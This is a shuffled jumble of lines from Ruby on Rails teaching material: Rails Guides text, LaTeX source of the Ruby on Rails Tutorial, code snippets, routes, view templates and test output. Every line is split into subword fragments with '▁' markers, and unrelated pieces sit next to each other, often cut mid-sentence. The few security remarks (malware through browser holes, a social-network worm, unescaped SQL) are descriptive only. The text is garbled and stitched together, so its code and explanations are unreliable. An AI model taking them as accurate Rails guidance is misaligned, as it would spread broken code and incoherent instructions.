▁| ▁PATCH / PUT ▁| ▁ / comments / : id (▖ : format ) ▁| ▁comments # update ▁| ▁ sekret _ comment _ path ▁|
▁< script ▁src ="/ assets / application ▖ js "></ script >
▁$ (" a [ data - background - color ] ")▖ click ▁( e ) ▁->
▁#< Client ▁id : ▁ 22 0, ▁first _ name : ▁" S ar a "> ,
▁@ customer ▁= ▁@ order ▖ create _ customer ( customer _ number : ▁ 123 ,
▁For ▁example , ▁with ▁this ▁route :
▁number _ to _ currency ( 1234567890▖50 ) ▁# ▁=> ▁$ 1, 2 34 , 5 67 , 89 0▖5 0
▁< option ▁value =" 12 "> In d ia </ option >
▁A ▁shorthand ▁for ▁this ▁is ▁to ▁use ▁a ▁hash ▁m app ing ▁attribute ▁names ▁to ▁the ▁desired ╼ value , ▁like ▁so :
▁#### ▁` first `
▁The ▁syntax ▁look s ▁like ▁this :
▁All ▁source ▁code ▁in ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁is ▁available ▁join t ly ▁under ▁the ▁\ href { http :// open source ▖ org / license s / MIT } { MIT ▁L ic en se } ▁and ▁the ▁\ href { http :// people ▖ free b s d ▖ org / ~ ph k /}{ B e er w a re ▁L ic en se } .
▁Access ible ▁attributes
▁foreign _ key ▁= ▁options [: foreign _ key ] ▁|| ▁ reflection ▖ active _ record ▖ name ▖ foreign _ key
▁For ▁readers ▁ com ing ▁from ▁Windows ▁or ▁( to ▁a ▁less er ▁but ▁ still ▁significant ▁ ext ent ) ▁M ac in to sh ▁OS ~ X , ▁the ▁Unix ▁command ▁line ▁may ▁be ▁un familiar .
▁ Contribut or ▖ limit (2) ▖ order (: rank )▖ to _ xml
▁( Because ▁helper ▁methods ▁are n ' t ▁available ▁in ▁tests , ▁we ▁can ' t ▁use ▁the ▁\ k ode { current \_ user } ▁as ▁in ▁Listing ~\ ref { code : logged _ in _ p }, ▁but ▁the ▁\ k ode { session } ▁method ▁is ▁available , ▁so ▁we ▁use ▁that ▁instead ▖)
▁ Updating ▁ 34 f 06 b 7 ▖ ▖ 2 c 92 be f
▁* ▁`: even ` ▁- ▁Specif ies ▁the ▁value ▁must ▁be ▁an ▁even ▁number ▁if ▁set ▁to ▁true ▖
▁We ▁start ▁by ▁ ar r an g ing ▁for ▁one ▁of ▁our ▁fixture ▁users ▁to ▁be ▁an ▁admin , ▁as ▁show n ▁in ▁Listing ~\ ref { code : fixture _ user _ admin } .
▁In ▁writing ▁this ▁code , ▁we ' ve ▁guess ed ▁that ▁SQL ▁supports ▁an ▁\ k ode { IN } ▁keyword ▁that ▁allows ▁us ▁to ▁test ▁for ▁set ▁inclusion ▖ ▁( H app ily , ▁it ▁does ▖)
▁De pending ▁on ▁the ▁ ar ity , ▁the ▁call able ▁is ▁invoke d ▁with ▁the ▁` options ` ▁hash ▁as ▁first ▁argument ▁with ▁` key ` ▁as ▁`: root `, ▁and ▁` key ` ▁ singularize d ▁as ▁second ▁argument ▖
▁Let ' s ▁say ▁you ▁want ed ▁to ▁route ▁all ▁users ▁on ▁a ▁blacklist ▁to ▁the ▁` Blacklist Controller ` ▖
▁te }╼╼ ▁% ▁subsection ▁a _ controller _ class ▁( end )╼╼ ╼ ▁\ subsection { A ▁user ▁class } ▁% ▁( fold )╼ ▁\ label { sec : a _ user _ class }╼╼
▁This ▁means ▁that ▁your ▁functional ▁and ▁integration ▁tests ▁that ▁use
▁The ▁purpose ▁of ▁our ▁tests ▁is ▁to ▁verify ▁that ▁click ing ▁the ▁signup ▁button ▁results ▁in ▁the ▁correct ▁behavior , ▁creating ▁a ▁new ▁user ▁when ▁the ▁information ▁is ▁valid ▁and ▁not ▁creating ▁a ▁user ▁when ▁it ' s ▁invalid .
▁A ▁mockup ▁of ▁the ▁ stats ▁partial .
▁< strong > T ext : </ strong >
▁The ▁result ▁is ▁a ▁display ▁of ▁the ▁feed ▁on ▁the ▁Home ▁page , ▁as ▁required ▁( Figure ~\ ref { fig : home _ with _ proto _ feed }) .
▁config ▖ log _ level ▁= ▁: info
▁The ▁method ▁` classify ` ▁is ▁the ▁ inverse ▁of ▁` tableize ` ▖
▁View ▁Path s
▁Route s ▁for ▁the ▁Microposts ▁resource .
▁If ▁you ▁skip ped ▁Section ~\ ref { sec : image _ upload _ in _ production }, ▁be ▁sure ▁to ▁commit ▁and ▁merge ▁your ▁changes :
▁The ▁engine ▁that ▁will ▁be ▁created ▁in ▁this ▁guide ▁will ▁be ▁called ▁" blorgh "▖
▁For ▁example , ▁you ▁m ight ▁have ▁a ▁ picture ▁model ▁that ▁belongs ▁to ▁either ▁an ▁ employee ▁model ▁or ▁a ▁ product ▁model ▖
▁Header ▁partial ▁with ▁links .
▁* ▁SQLite 3 : ▁[ EXPLAIN ▁ Q U E RY ▁P LA N ]( http :// www ▖ sqlite ▖ org / eq p ▖ html )
▁but ▁that ▁isn ' t ▁the ▁Rails ▁Way .
▁If ▁` value ` ▁is ▁` nil ` ▁an ▁attribute ▁" nil " ▁set ▁to ▁" true " ▁is ▁added ▖
▁S ince ▁the ▁security ▁restrict ion s ▁for ▁the ▁\ k ode { edit } ▁and ▁\ k ode { update } ▁actions ▁are ▁identical , ▁we ' ll ▁handle ▁them ▁in ▁a ▁single ▁RSpec ▁\ k ode { desc ri be } ▁block .
▁First ▁we ▁generate ▁the ▁relevant ▁test :
▁For ▁example , ▁the ▁page ▁for ▁ listing ▁all ▁users ▁is ▁at ▁\ href { http ://0▖0▖0▖0:3000/ users }{/ users }, ▁and ▁the ╼ page ▁for ▁making ▁a ▁new ▁user ▁is ▁at ▁\ href { http ://0▖0▖0▖0:3000/ users / new }{/ users / new } .
▁Now ▁that ▁you ' ve ▁seen ▁how ▁to ▁create ▁a ▁controller , ▁an ▁action ▁and ▁a ▁view , ▁let ' s ╼ create ▁something ▁with ▁a ▁bit ▁more ▁substan ce .
▁now ▖ change ( hour : ▁0 )
▁Client ▖ a verage (" orders _ count ")
▁Ruby ▁has ▁a ▁built - in ▁method ▁` Hash # merge ` ▁that ▁merge s ▁two ▁hashes :
▁ al id ▁email ▁address , ▁like ▁` `@ example ▖ com '' ? ╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - 6 ac cd 1 ' ></ span >╼╼ ▁\ item ▁ Destroy ▁each ▁of ▁the ▁users ▁created ▁in ▁the ▁previous ▁ exercises ▖ ▁Doe s ▁Rails ▁display ▁a ▁message ▁by ▁default ▁when ▁a ▁user ▁is ▁destroyed ? ╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - a b c 7 b d ' ></ span >╼ \ end { enumerate }╼╼ ▁% ▁subsection ▁a _ user _ tour ▁( end )╼╼ ▁\ subsection { MVC ▁in ▁action } ▁% ▁( fold )╼ ▁\ label { sec : mvc _ in _ action }╼╼
▁Note ▁that , ▁because ▁it ▁is ▁now ▁raw ▁SQL , ▁\ k ode { followed \_ user \_ id s } ▁is ▁\ emph { interpolate d }, ▁not ▁escape d .
▁For ▁each ▁controller ▁there ▁is ▁an ▁ associated ▁directory ▁in ▁the ▁` app / views ` ▁directory ▁which ▁hold s ▁the ▁template ▁files ▁that ▁make ▁up ▁the ▁views ▁ associated ▁with ▁that ▁controller ▖
▁You ▁may ▁have ▁notice d ▁that ▁the ▁new ▁user ▁object ▁ha d ▁\ k ode { nil } ▁values ▁for ▁the ▁\ k ode { id } ▁and ▁the ▁magic ▁columns ▁\ k ode { created \_ at } ▁and ▁\ k ode { updated \_ at } ▁attributes .
▁ W hether ▁a ▁changing ▁title ▁represent s ▁\ emph { t ru ly } ▁dynamic ▁content ▁is ▁ de b a table , ▁but ▁in ▁any ▁case ▁it ▁ la y s ▁the ▁necessary ▁foundation ▁for ▁un a mb ig u ous ly ▁dynamic ▁content ▁in ▁Chapter ~\ ref { cha : sign _ up } .
▁Note ▁that ▁the ▁ fa m ily ▁of ▁` require ` ▁ directive s ▁prevent s ▁files ╼ from ▁being ▁included ▁t w ice ▁in ▁the ▁output .
▁We ' ll ▁see ▁in ▁the ▁next ▁two ▁section s ▁what ▁effect s ▁this ▁has .
▁O p en ▁` doc / guides / index ▖ html ` ▁in ▁your ╼ ▁web ▁browser ▁to ▁explor e ▁the ▁Guides .
▁In ▁this ▁case , ▁you ▁can ▁use ▁a ▁ singular ▁resource ▁to ▁map ▁` / profile ` ▁( ra the r ▁than ▁` / profile / : id ` ) ▁to ▁the ▁` show ` ▁action :
▁( S e e ▁the ▁next ▁section ▁for ▁report ing ▁security ▁issues ▖)
▁ Control s ▁what ▁happens ▁to ▁the ▁ associated ▁objects ▁when ▁their ▁ owner ▁is ▁destroyed :
▁On ce ▁you ' ve ▁placed ▁your ▁assets ▁in ▁their ▁ logical ▁location s , ▁you ▁can ▁use ▁\ emph { manifest ▁files } ▁to ▁tell ▁Rails ▁( via ▁the ▁\ href { https :// github ▖ com / s s te phens on / sprockets } { Sprockets } ▁gem ) ▁how ▁to ▁combine ▁them ▁to ▁form ▁single ▁files .
▁This ▁uses ▁the ▁\ k ode { xhr } ▁method ▁( for ▁ XmlHttpRequest ) ▁to ▁issue ▁an ▁Ajax ▁request , ▁which ▁cause s ▁the ▁\ k ode { respond \_ to } ▁block ▁in ▁Listing ~\ ref { code : relationships _ controller _ ajax } ▁to ▁execute ▁the ▁proper ▁JavaScript ▁method .
▁so ▁that ▁the ▁root ▁route ▁we nt ▁to ▁the ▁\ k ode { hello } ▁action ▁in ▁the ▁Application ▁controller .
▁We ▁can ▁easily ▁add ▁behavior ▁to ▁any ▁link ▁by ▁adding ▁the ▁data ╼ attribute ▖
▁Setting ▁the ▁root ▁route .
▁( I ▁include ▁\ k ode { ex it } ▁in ▁the ▁last ▁line ▁just ▁to ▁demonstrate ▁how ▁to ▁ ex it ▁the ▁console .
▁The ▁result ing ▁relationships ▁will ▁be ▁ sufficient ▁for ▁developing ▁the ▁application ▁interface .
▁Rails ▁supports ▁data ▁validations ▁to ▁place ▁constraints ▁on ▁the ▁values ▁of ▁data ▁model ▁attributes .
▁* ▁` update _ columns `
▁d ▁= ▁ DateTime ▖ new (201 0, ▁2, ▁28 , ▁ 23 , ▁ 59 , ▁ 59 )
▁With in ▁sever al ▁hours ▁he ▁ha d ▁over ▁1 ▁m illion ▁f ri end ▁requests , ▁but ▁it ▁creates ▁too ▁much ▁traffic ▁on ▁ MySpace , ▁so ▁that ▁the ▁site ▁go es ▁off line ▖
▁It ▁is ▁a im ed ▁both ▁at ▁those ▁who ▁work ▁with ▁software ▁developers ▁and ▁those ▁who ▁as p i re ▁to ▁become ▁developers ▁themselves .
▁in ▁Listing ~\ ref { code : first _ create _ action } .
▁In ▁this ▁context , ▁ having ▁the ▁ hello , ▁toy , ▁and ▁sample ▁app s ▁present ▁in ▁the ▁same ▁project ▁can ▁be ▁in con ve n i ent ▁due ▁to ▁the ▁many ▁common ▁filename s .
▁In ▁this ▁case , ▁using ▁`@ part s ▖ assemblies ▖ create ` ▁or ▁`@ part s ▖ assemblies ▖ build ` ▁will ▁create ▁orders ▁where ▁the ▁` factory ` ▁column ▁has ▁the ▁value ▁" S eattle " .
▁ Adding ▁Bitbucket ▁and ▁push ing ▁up ▁the ▁repository .
▁Or ▁they ▁could ▁install ▁ malicious ▁software ▁through ▁browser ▁security ▁hole s ▁on ▁that ▁site ▖
▁<%= ▁f ▖ label ▁: title ▁%>< br >
▁== ▁Create Article s : ▁migrat ed ▁(0▖00 20 s ) ▁============= ============== ==============
▁In ▁particular , ▁we ' ll ▁make ▁an ▁\ k ode { ac t i v ate } ▁method ▁to ▁update ▁the ▁user ' s ▁activation ▁attributes ▁and ▁a ▁\ k ode { send \_ activation \_ email } ▁to ▁send ▁the ▁activation ▁email .
▁By ▁default ▁this ▁is ▁` false ` ▁in ▁test ▁mode ▁and ▁` true ` ▁in ▁all ▁other ▁mode s .
▁config ▖ action _ mailer ▖ smtp _ settings ▁= ▁ {
▁This ▁pattern ▁of ▁setting ▁a ▁cookie ▁that ▁ expire s ▁20 ▁ years ▁in ▁the ▁future ▁be c a me ▁so ▁common ▁that ▁Rails ▁added ▁a ▁special ▁\ k ode { permanent } ▁method ▁to ▁implement ▁it , ▁so ▁that ▁we ▁can ▁simply ▁write
▁U nfortunately , ▁visit ing ▁that ▁URL ▁right ▁now ▁just ▁gives ▁an ▁error , ▁as ▁seen ▁in ▁the ▁server ▁log ▁( Figure ~\ ref { fig : profile _ routing _ error }) .
▁build _ account
▁ EXPLAIN ▁for : ▁ SELECT ▁" users " .
▁You ▁can ▁use ▁the ▁same ▁technique ▁to ▁local ize ▁the ▁ rescue ▁files ▁in ▁your ▁public ▁directory ▖
▁The ▁Home ▁page ▁(\ href { http :// localhost :3000/}{/}) ▁with ▁follow ▁ stats ▖ ~\ href { http :// railstutorial ▖ org / images / figures / home _ page _ follow _ stats _ bootstrap - full ▖ png }{( full ▁size )}
▁As ▁interpret ed ▁by ▁Rails , ▁the ▁REST ▁architecture ▁includes ▁a ▁standard ▁set ▁of ▁URLs ▁and ▁controller ▁actions ▁for ▁interact ing ▁with ▁data ▁models .
▁here ▁we ' ll ▁use ▁the ▁corresponding ▁\ k ode { assert \_ difference } ▁method :
▁class ▁Application ▁< ▁Rails :: Application
▁Now ▁that ▁we ▁have ▁a ▁working ▁signup ▁page , ▁it ' s ▁time ▁to ▁deploy ▁our ▁application ▁and ▁get ▁it ▁working ▁in ▁production .
▁#### ▁hidden _ field
▁There ' s ▁another ▁subtlety ▁to ▁address ▁here : ▁the ▁code ▁\ k ode { form \_ for (@ user )} ▁in ▁Listing ~\ ref { code : user _ edit _ view } ▁is ▁\ emph { exactly } ▁the ▁same ▁as ▁the ▁code ▁in ▁Listing ~\ ref { code : signup _ form } --- so ▁how ▁does ▁Rails ▁know ▁to ▁use ▁a ▁\ text tt { POST } ▁request ▁for ▁new ▁users ▁and ▁a ▁\ text tt { PATCH } ▁for ▁edit ing ▁users ?
▁( Re call ▁from ▁Section ~\ ref { sec : hashes _ and _ symbols } ▁that ▁hyphen s ▁can ' t ▁be ▁used ▁in ▁symbols ▖)
▁The ▁task ▁definition s ▁are ▁defined ▁throughout ▁the ▁ components ▁of ▁Rails ▖
▁The ▁asset ▁pipeline ▁is ▁enabled ▁by ▁default .
▁Now ▁that ▁you ▁have ▁a ▁` Template ` ▁class , ▁it ' s ▁time ▁to ▁associate ▁it ▁with ▁an ╼ extension ▁for ▁template ▁files :
▁If ▁your ▁application ▁is ▁current ly ▁on ▁any ▁version ▁of ▁Rails ▁old er ▁than ▁3▖2 ▖ x , ▁you ▁should ▁upgrade ▁to ▁Rails ▁3▖2 ▁before ▁attempt ing ▁one ▁to ▁Rails ▁4▖0 .
▁You ' ll ▁need ▁to ▁create ▁a ▁( free ) ▁GitHub ▁account ▁in ▁order ▁to ▁submit ▁an ▁issue , ▁to ▁comment ▁on ▁them ▁or ▁to ▁create ▁pull ▁requests .
▁HTTP /1▖1 ▁ 302 ▁F ound ▁[ First ▁standard ▁ 302 ▁response ]
▁remove _ method ( method _ name )
▁You ▁can ▁ swap ▁an ▁existing ▁middleware ▁in ▁the ▁middleware ▁ stack ▁using ▁` config ▖ middleware ▖ swap ` .
▁as ▁show n ▁in ▁Listing ~\ ref { code : add _ micropost _ different _ owner } .
▁What ▁is ▁Active ▁Record ?
▁I 18 n ▖ locale ▁= ▁: expert ▁if ▁current _ user ▖ expert ?
▁invoke ▁assets
▁ String s ▁are ▁consider ed ▁to ▁be ▁ _ un safe _ ▁by ▁default :
▁For ▁example , ▁suppose ▁your ▁application ▁includes ▁these ▁models :
▁You ▁can ▁also ▁pass ▁in ▁arbitrar y ▁local ▁variables ▁to ▁any ▁partial ▁you ▁are ▁rendering ▁with ▁the ▁` local s : ▁ { } ` ▁option :
▁You ▁can ▁use ▁the ▁`: location ` ▁option ▁to ▁set ▁the ▁HTTP ▁` Location ` ▁header :
▁<%= ▁render ▁@ customer ▁%>
▁This ▁would ▁ de t ec t ▁that ▁there ▁are ▁no ▁ books ▁with ▁the ▁specified ▁ ID , ▁ populate ▁the ▁`@ books ` ▁instance ▁variable ▁with ▁all ▁the ▁ books ▁in ▁the ▁model , ▁and ▁then ▁directly ▁render ▁the ▁` index ▖ html ▖ erb ` ▁template , ▁return ing ▁it ▁to ▁the ▁browser ▁with ▁a ▁flash ▁ alert ▁message ▁to ▁tell ▁the ▁user ▁what ▁happen ed .
▁development :
▁For ▁example , ▁\ k ode { name } ▁should ▁be ▁non - blank , ▁and ▁\ k ode { email } ▁should ▁match ▁the ▁specific ▁format ▁character ist ic ▁of ▁email ▁addresses .
▁By ▁design , ▁the ▁ Faker ▁gem ' s ▁\ emph { lo re m ▁ ip sum } ▁text ▁is ▁random ize d , ▁so ▁the ▁contents ▁of ▁your ▁sample ▁microposts ▁will ▁differ .
▁### ▁` ordinalize `
▁As ▁describe d ▁earlier , ▁by ▁ placing ▁the ▁gem ▁in ▁the ▁` Gemfile ` ▁it ▁will ▁be ▁loaded ▁when ╼ Rails ▁is ▁loaded ▖
▁In ▁this ▁section , ▁we ▁cover ▁two ▁of ▁the ▁most ▁important ▁improve ment s , ▁\ emph { n est ing } ▁and ▁\ emph { variable s } .
▁ Adding ▁a ▁\ k ode { hello } ▁action ▁to ▁the ▁Application ▁controller .
▁You ▁can ▁find ▁ detailed ▁instructions ▁on ▁how ▁to ▁test ▁your ▁ mailers ▁in ▁the ╼[ testing ▁guide ]( testing ▖ html # testing - your - mailers ) .
▁In ▁this ▁case , ▁you ▁could ▁include ▁this ▁route ▁declaration :
▁=> ▁[" n ", ▁" a ", ▁" m ", ▁" e "]
▁as ▁show n ▁in ▁Listing ~\ ref { code : micropost _ dependency } .
▁The ▁simple st ▁template ▁that ▁would ▁work ▁in ▁this ▁case ▁would ▁be ▁one ▁located ▁at ╼` app / views / articles / new ▖ html ▖ erb ` ▖
▁Noti ce ▁here ▁that ▁we ▁\ k ode { render } ▁a ▁partial ▁called ▁\ k ode { ' shared / error \_ messages ' } ; ▁this ▁reflect s ▁the ▁common ▁Rails ▁convention ▁of ▁using ▁a ▁d ed icated ▁\ k ode { shared / } ▁directory ▁for ▁partials ▁expected ▁to ▁be ▁used ▁in ▁views ▁a cross ▁multiple ▁controllers .
▁#### ▁url _ field
▁* ▁` config / application ▖ rb `
▁As ▁with ▁plural ▁resources , ▁the ▁same ▁helpers ▁end ing ▁in ▁` _ url ` ▁will ▁also ▁include ▁the ▁host , ▁ port ▁and ▁path ▁prefix .
▁where ▁we ▁need ▁to ▁fill ▁in ▁the ▁comment ▁with ▁the ▁appropriate ▁code .
▁NOTE : ▁You ▁can ▁use ▁sub fold ers ▁to ▁ org an ize ▁your ▁ initializers ▁if ▁you ▁like , ▁because ▁Rails ▁will ▁look ▁into ▁the ▁whole ▁file ▁hierarchy ▁from ▁the ▁ initializers ▁folder ▁on ▁down .
▁ Follow ing ▁the ▁model ▁of ▁passwords ▁( Listing ~\ ref { code : find _ authenticate _ user }) ▁and ▁remember ▁token s ▁( Listing ~\ ref { code : persistent _ current _ user }), ▁we ▁plan ▁to ▁find ▁and ▁ authenticate ▁the ▁user ▁with ▁code ▁something ▁like ▁this :
▁$ ▁rails ▁generate
▁now ▁= ▁ DateTime ▖ current
▁get ▁' : controller / : action / : id / with _ user / : user _ id '
▁def ▁ expiration _ date _ cannot _ be _ in _ the _ past
▁P utting ▁these ▁elements ▁together ▁yields ▁the ▁test ▁in ▁Listing ~\ ref { code : micropost _ validity _ test } .
▁The ▁main ▁purpose ▁of ▁our ▁test ▁is ▁to ▁verify ▁that ▁click ing ▁the ▁signup ▁button ▁results ▁in ▁\ emph { not } ▁creating ▁a ▁new ▁user ▁when ▁the ▁submitted ▁information ▁is ▁invalid .
▁First , ▁there ' s ▁\ k ode { first } :
▁< h 1> Listing ▁Article s </ h 1>
▁To ▁write ▁tests ▁for ▁the ▁delete ▁functionality , ▁it ' s ▁helpful ▁to ▁be ▁able ▁to ▁have ▁a ▁ factory ▁to ▁create ▁admin s .
▁Ruby ▁on ▁Rails ╼ T u to ri al
▁Re g ar d less ▁of ▁which ▁database ▁system ▁you ' re ▁using , ▁the ▁Active ▁Record ▁method ▁format ▁will ▁always ▁be ▁the ▁same .
▁Because ▁web ▁applications ▁have ▁so ▁many ▁mov ing ▁parts , ▁they ▁offer ▁ amp le ▁opportunit ies ▁to ▁develop ▁your ▁technical ▁ sophistication .
▁Note ▁here ,╼ how ever , ▁that ▁the ▁migration ▁is ▁called ▁` create _ blorgh _ articles ` ▁rather ▁than ▁the ╼ us u al ▁` create _ articles ` ▖
▁You ▁may ▁recall ▁from ▁Section ~\ ref { sec : a _ class _ of _ our _ own } ▁that ▁Ruby ▁let s ▁you ▁add ▁methods ▁to ▁\ emph { any } ▁class , ▁even ▁built - in ▁one s .
▁We ▁use ▁the ▁complement ary ▁method ▁\ k ode { after (: all )} ▁to ▁delete ▁the ▁users ▁once ▁we ' re ▁done .
▁By ▁ putting ▁together ▁everything ▁we ' ve ▁ learned ▁in ▁this ▁book , ▁we ' ve ▁successfully ▁implemented ▁user ▁following ▁with ▁a ▁status ▁feed ▁of ▁microposts ▁from ▁followed ▁users .
▁Of ▁course , ▁this ▁simplicity ▁is ▁a ▁sign ▁of ▁being ▁\ emph { more } ▁advanced , ▁not ▁less --- we ' ve ▁come ▁a ▁long ▁way ▁since ▁our ▁re li ance ▁on ▁scaffold ing ▁in ▁Chapter ~\ ref { cha : a _ toy _ app }, ▁and ▁we ▁no ▁longer ▁need ▁most ▁of ▁its ▁complex ity .
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : destroy _ session }
▁method .
▁( If ▁you ▁find ▁this ▁note ▁confusing , ▁it ▁is ▁ safe ▁to ▁ignore ▁it ▖)
▁belongs _ to ▁: account
▁( S u ch ▁configuration ▁settings ▁can ▁be ▁f id d ly ▁and ▁error - prone , ▁so ▁I ▁main ly ▁recommend ▁them ▁for ▁more ▁advanced ▁users ; ▁S ublime ▁Text ▁is ▁an ▁excellent ▁choice ▁for ▁edit ing ▁Rails ▁applications ▁even ▁without ▁the ▁advanced ▁setup ▖)
▁Action ▁Mailer ▁Basic s
▁\ label { fig : user _ index _ mockup } }╼\ end { figure }╼╼ ╼ ▁\ subsection { Users ▁index } ▁% ▁( fold )╼ ▁\ label { sec : users _ index }╼╼
▁By ▁the ▁way , ▁you ▁can ▁see ▁a ▁list ▁of ▁your ▁commit ▁messages ▁using ▁the ▁\ k ode { log } ▁command :
▁X - S er ve d - B y : ▁cache - d f w 18 28 - D F W
▁Wi ll ▁generate ▁this ▁HTML ▁output :
▁The ▁argument ▁of ▁\ text tt { let } ▁is ▁a ▁symbol , ▁and ▁it ▁take s ▁a ▁block ▁who se ▁return ▁value ▁is ▁as signed ▁to ▁a ▁local ▁variable ▁with ▁the ▁symbol ' s ▁name .
▁store
▁ Adding ▁the ▁ SSH ▁public ▁key .
▁Fin is h ed ▁in ▁0▖0 19 99 ▁second s
▁This ▁means ▁that , ▁no ▁matter ▁where ▁you ▁current ly ▁are ▁in ▁your ▁ knowledg e ▁of ▁web ▁development , ▁by ▁the ▁time ▁you ▁finish ▁this ▁tutorial ▁you ▁will ▁be ▁ready ▁for ▁more ▁advanced ▁Rails ▁resources , ▁as ▁well ▁as ▁for ▁the ▁more ▁system at ic ▁treat ment s ▁of ▁the ▁other ▁subject s ▁mentioned .
▁Convert ing ▁the ▁\ k ode { Gemfile } ▁in ▁Listing ~\ ref { code : default _ gemfile } ▁to ▁use ▁exact ▁gem ▁versions ▁results ▁in ▁the ▁code ▁show n ▁in ▁Listing ~\ ref { code : gemfile _ sqlite _ version } .
▁The ▁examples ▁above ▁show ▁that ▁` in _ groups ` ▁fill s ▁some ▁ groups ▁with ▁a ▁ tr ailing ▁` nil ` ▁element ▁as ▁needed ▖
▁ Symbol s ▁look ▁kind ▁of ▁like ▁strings , ▁but ▁prefix ed ▁with ▁a ▁ col on ▁instead ▁of ▁ s ur rounded ▁by ▁ quot es .
▁Here ▁the ▁\ k ode { following \_ id s } ▁method ▁is ▁ sy n the size d ▁by ▁Active ▁Record ▁base d ▁on ▁the ▁\ k ode { has \_ many ▁: following } ▁association ▁( Listing ~\ ref { code : has _ many _ following _ through _ active _ relationships }) ; ▁the ▁result ▁is ▁that ▁we ▁need ▁only ▁ append ▁\ k ode { \_ id s } ▁to ▁the ▁association ▁name ▁to ▁get ▁the ▁id s ▁corresponding ▁to ▁the ▁\ k ode { user ▖ following } ▁collection .
▁Section ~\ ref { sec : the _ relationship _ model } ▁placed ▁rather ▁heav y ▁d em and s ▁on ▁our ▁data ▁ modeling ▁ s kill s , ▁and ▁it ' s ▁fine ▁if ▁it ▁take s ▁a ▁while ▁to ▁so a k ▁in .
▁mail _ in _ production ▁( end ) ╼╼% ▁section ▁password _ reset ▁( end )╼╼ \ section { Co nclusion } ▁% ▁( fold )╼\ label { sec : resets _ co nclusion }╼╼
▁N a v ig ate ▁to ▁< http :// localhost :3000/ articles / new > ▁and ▁you ' ll ▁see ▁a ▁routing ╼ error :
▁The ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁take s ▁an ▁in te gr at ed ▁approach ▁to ▁web ▁development ▁by ▁build ing ▁three ▁example ▁applications ▁of ▁increasing ▁ sophistication , ▁starting ▁with ▁a ▁minimal ▁\ emph { hello } ▁app ▁( Section ~\ ref { sec : the _ hello _ application }), ▁a ▁slightly ▁more ▁cap able ▁\ emph { toy } ▁app ▁( Chapter ~\ ref { cha : a _ toy _ app }), ▁and ▁a ▁real ▁\ emph { sample } ▁app ▁( Chapter ~\ ref { cha : static _ pages } ▁through ▁Chapter ~\ ref { cha : following _ users }) .
▁* ▁` asset - path (" rails ▖ png ") ` ▁becomes ▁` " / assets / rails ▖ png " `
▁#### ▁Find ing ▁Layouts
▁ ╼ / ▖ bundle ╼╼ # ▁I gnore ▁the ▁default ▁SQLite ▁database .
▁ Math ▖ co s (0) ▖ to _ i ▖ object _ id ▁# ▁=> ▁3
▁T hough ▁good ▁for ▁getting ▁a ▁general ▁ overview ▁of ▁Rails , ▁the ▁scaffold ▁Users ▁resource ▁ s uffer s ▁from ▁a ▁number ▁of ▁sever e ▁we a k ness es .
▁Ou r ▁method ▁is ▁to ▁iterate ▁through ▁the ▁\ k ode { flash } ▁and ▁insert ▁all ▁relevant ▁messages ▁into ▁the ▁site ▁layout .
▁ Engine ▁model ▁and ▁controller ▁classes ▁can ▁be ▁extend ed ▁by ▁open ▁class ing ▁them ▁in ▁the ╼ main ▁Rails ▁application ▁( since ▁model ▁and ▁controller ▁classes ▁are ▁just ▁Ruby ▁classes ╼ that ▁inherit ▁Rails ▁specific ▁functionality )▖
▁Because ▁a ▁User ▁object ▁is ▁true ▁in ▁a ▁boolean ▁context , ▁the ▁call ▁to ▁\ k ode { find \_ by } ▁only ▁get s ▁executed ▁if ▁\ k ode {@ current \_ user } ▁has n ' t ▁yet ▁been ▁as signed .
▁In ▁other ▁words , ▁this ▁query ▁can ▁be ▁generated ▁by ▁calling ▁` where ` ▁with ▁no ▁argument , ▁then ▁immediately ▁ chain ▁with ▁` not ` ▁passing ▁` where ` ▁conditions .
▁as ▁seen ▁in ▁Listing ~\ ref { code : microposts _ resource } .
▁It ▁is ▁important ▁to ▁note ▁that ▁Git ▁commit s ▁are ▁\ emph { local }, ▁record ed ▁only ▁on ▁the ▁machine ▁on ▁which ▁the ▁commit s ▁occur .
▁#### ▁Name d ▁Date times
▁Start ▁comments ▁in ▁upper ▁case ▖
▁╼╼ ▁\ subsection { G u ide ▁to ▁further ▁resources } ▁% ▁( fold )╼ ▁\ label { sec : guid e _ to _ f ur the r _ resources }╼╼
▁This ▁will ▁produce :
▁( A t ▁this ▁point , ▁I ▁also ▁recommend ▁remov ing ▁the ▁\ k ode { hello } ▁action ▁from ▁the ▁Application ▁controller ▁if ▁you ▁added ▁it ▁in ▁Section ~\ ref { sec : sample _ app _ setup } ▖)
▁We ' ll ▁accomplish ▁this ▁using ▁the ▁\ k ode { where } ▁method ▁on ▁the ▁\ k ode { Micropost } ▁model ▁( se en ▁brief ly ▁before ▁in ▁Section ~\ ref { sec : exercises _ activation _ test _ and _ refactoring }), ▁as ▁show n ▁in ▁Listing ~\ ref { code : proto _ status _ feed }
▁* ▁How ▁to ▁test ▁your ▁Action ▁Mailer ▁classes .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / array / prepend _ and _ append ▖ rb ` .
▁anything
▁ ╼ ▁other _ user ▁= ▁users (: ma lo ry )╼ ▁log _ in _ as ( other _ user )╼ ▁get ▁root _ path ╼ ▁ assert _ match ▁" 0 ▁microposts ", ▁response ▖ body ╼ ▁other _ user ▖ microposts ▖ create !( content : ▁" A ▁micropost " )╼ ▁get ▁root _ path ╼ ▁ assert _ match ▁ FILL _ IN , ▁response ▖ body ╼ ▁end ╼ end ╼\ end { code }╼\ end { code listing } ╼╼% ▁subsection ▁micropost _ tests ▁( end )╼╼ ▁% ▁section ▁ manipulati n g _ microposts ▁( end )╼╼ ╼ ▁\ section { Micropost ▁images } ▁% ▁( fold )╼ ▁\ label { sec : micropost _ images }╼╼
▁To ▁avoid ▁code ▁repetition , ▁you ▁should ▁also ▁remove ▁\ k ode { logged \_ in \_ user } ▁from ▁the ▁Users ▁controller ▁at ▁this ▁time .
▁The ▁\ k ode { log \_ out } ▁method .
